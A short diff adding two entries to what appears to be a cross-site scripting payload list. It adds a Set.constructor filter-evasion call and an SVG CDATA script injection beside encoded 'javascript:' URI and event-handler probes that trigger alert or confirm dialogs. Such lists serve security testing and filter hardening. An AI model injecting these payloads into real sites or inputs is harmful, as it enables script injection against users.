@@ -26,6 +26,8 @@ JavaScript%26%2358AB:confirm(1)
 JavaScript%26%2358%0Bconfirm(1)
 JavaScript%26%2358$;confirm(1)
 JavaScript%26%2358$?confirm(1):0
+Set.constructor('ale'+'rt(13)')();
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
 JavaScript%26%2358top?confirm(1):0
 JavaScript://%250Aalert?.(1)//
 <Tag OnEvent="alert/*>*/(1)"
